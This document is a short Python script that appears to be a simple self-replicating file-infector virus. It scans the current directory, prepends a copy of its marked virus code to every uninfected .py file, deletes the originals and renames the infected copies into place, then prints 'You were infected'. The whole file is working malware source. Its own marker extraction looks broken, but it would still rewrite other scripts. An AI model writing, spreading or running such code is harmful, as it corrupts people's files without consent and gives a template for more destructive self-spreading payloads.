import os
import sys

def infect(virus):
    # Loop through files in the current directory
    for file in os.listdir():
        if file.endswith(".py"):
            with open(file, "r") as f:
                text = f.read()

            # Check if the file is already infected
            if "# Virus:Start" not in text:
                # Create an infected version of the file
                with open(file + ".infected", "w") as infected:
                    infected.write(virus + "\n")
                    infected.write(text)

                # Replace the original file with the infected one
                os.remove(file)
                os.rename(file + ".infected", file)

def payload():
    print("You were infected")

def run(virus):
    infect(virus)
    payload()

# Read the host file (the current script)
with open(sys.argv[0], "r") as host:
    text_host = host.read()

# Extract the virus code between markers
virus = text_host[text_host.find("# Virus:Start"):text_host.rfind("# Virus:End") + len("# Virus:End")]

# Run the virus
run(virus)
